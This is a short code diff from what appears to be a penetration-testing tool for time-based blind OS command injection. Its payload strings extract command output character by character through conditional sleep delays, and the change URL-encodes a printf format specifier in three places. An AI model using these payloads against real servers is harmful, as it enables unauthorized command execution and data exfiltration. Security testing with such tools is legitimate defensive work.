@@ -379,7 +379,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Export char-by-char the execution output.
                 "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                 # Transform from Ascii to Decimal.
-                "str=$(printf %d \"'$char'\")" + separator +
+                "str=$(printf %25d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "if [ " + str(ascii_char) + " != $str ]" + separator +
                 "then sleep 0" + separator +
@@ -395,7 +395,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Export char-by-char the execution output.
                 "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                 # Transform from Ascii to Decimal.
-                "str=$(printf %d \"'$char'\")" + separator +
+                "str=$(printf %25d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "if [ " + str(ascii_char) + " != $str ]" + separator +
                 "then sleep 0" + separator +
@@ -416,7 +416,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Export char-by-char the execution output.
                 "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                 # Transform from Ascii to Decimal.
-                "str=$(printf %d \"'$char'\")" + separator +
+                "str=$(printf %25d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
                 "sleep " + str(timesec)
